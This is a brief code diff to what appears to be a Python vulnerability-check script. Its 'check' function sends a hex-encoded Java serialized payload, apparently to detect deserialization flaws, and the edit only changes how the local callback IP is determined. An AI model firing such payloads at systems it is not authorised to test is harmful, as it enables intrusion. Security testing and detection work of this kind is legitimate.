@@ -28,9 +28,9 @@ def random_str(len):
     return str(str1)
 
 
-def get_ver_ip():
+def get_ver_ip(ip):
     csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    csock.connect(('8.8.8.8', 80))
+    csock.connect((ip, 80))
     (addr, port) = csock.getsockname()
     csock.close()
     return addr
@@ -88,7 +88,7 @@ def check(ip, port, timeout):
              '68726573686f6c6478703f40000000000000770800000010000000007878767200126a61' \
              '76612e6c616e672e4f766572726964650000000000000000000000787071007e003a'
         payloadObj = binascii.a2b_hex(dd)
-        dnsserver = get_ver_ip()
+        dnsserver = get_ver_ip(ip)
         dl = len(dnsserver)
         dis = dl - 12
         ramdmum = random_str(6 - dis)
